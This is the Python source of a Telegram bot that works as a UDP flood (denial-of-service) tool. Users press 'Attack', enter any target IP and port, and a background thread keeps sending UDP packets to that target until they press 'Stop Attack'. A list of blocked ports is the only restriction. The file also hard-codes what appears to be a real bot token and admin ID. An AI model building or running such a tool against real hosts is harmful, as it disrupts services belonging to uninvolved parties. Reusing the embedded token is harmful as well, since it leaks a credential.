import telebot
import socket
import threading
import time
import random
import json

# Your bot token and admin ID
TOKEN = '7193689694:AAFB4JIHXu03pOvCc9mwoPStH1beRr0Yfuc'
ADMIN_IDS = [6302429987]  # List of admin IDs
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports

bot = telebot.TeleBot(TOKEN)

# Global variables for attack status
target_ip = None
target_port = None
attack_running = False
packet_count = 0  # Packet counter

# User agents for simulation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1.2 Safari/603.1.30",
    "Mozilla/5.0 (Linux; Android 7.0; Nexus 5X Build/NPR1.170102.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
]

# Welcome message when the bot starts
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, f"Hello, {message.from_user.first_name}! Are you ready? Click /start to initiate.")
    bot.send_message(message.chat.id, "Please choose an option:", reply_markup=create_buttons())

# Button layout
def create_buttons():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton("Attack")
    btn_stop = telebot.types.KeyboardButton("Stop Attack")
    markup.add(btn_attack, btn_stop)
    return markup

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    global attack_running, packet_count
    if message.text == "Attack":
        if attack_running:  # Check if an attack is already running
            bot.send_message(message.chat.id, "An attack is already in progress. Please stop it first.")
            return
        
        bot.send_message(message.chat.id, "Please enter the target IP and port in the format 'ip:port (Port Map)'.")
        bot.register_next_step_handler(message, process_ip_port)
    elif message.text == "Stop Attack":
        if attack_running:
            attack_running = False
            bot.send_message(message.chat.id, "Attack stopped.")
        else:
            bot.send_message(message.chat.id, "No attack is currently running.")

def process_ip_port(message):
    global target_ip, target_port, attack_running, packet_count
    try:
        # Extract IP and port from the input format
        ip_port = message.text.split(" (")[0]  # Ignore the "(Port Map)" part
        ip_port = ip_port.split(":")
        if len(ip_port) != 2:
            raise ValueError("Invalid format")

        target_ip = ip_port[0]
        target_port = int(ip_port[1])  # Convert port to integer

        # Validate IP address and port range
        socket.inet_aton(target_ip)
        if target_port < 1 or target_port > 65535:
            raise ValueError("Port must be between 1 and 65535")

        # Check if the port is blocked
        if target_port in BLOCKED_PORTS:
            bot.send_message(message.chat.id, "This port is blocked, choose another port.")
            bot.send_message(message.chat.id, "Please enter the target IP and port in the format 'ip:port (Port Map)'.")
            bot.register_next_step_handler(message, process_ip_port)  # Re-register for new input
            return

        # Stop any ongoing attack before starting a new one
        if attack_running:
            attack_running = False  # Stop the current attack

        bot.send_message(message.chat.id, f"Attacking {target_ip}:{target_port}...")
        attack_running = True
        packet_count = 0  # Reset the packet count
        attack_thread = threading.Thread(target=send_packets)
        attack_thread.start()

    except ValueError:
        bot.send_message(message.chat.id, "Invalid input. Please enter the IP and port in the format 'ip:port (Port Map)'.")
        bot.register_next_step_handler(message, process_ip_port)

def send_packets():
    global attack_running, packet_count
    while attack_running:
        try:
            # Create a new socket and send a UDP packet
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
            sock.sendto(b'\x00', (target_ip, target_port))  # Send empty byte
            packet_count += 1  # Increment packet count

            # Optional: Log packet count every 100 packets
            if packet_count % 100 == 0:
                print(f"Packets sent: {packet_count}")

            # Optional: Add a small sleep to control the rate of sending packets if needed
            time.sleep(0.01)  # Adjust this to control the sending rate

        except Exception as e:
            print(f"Error sending packet: {e}")

# Start polling
bot.polling()
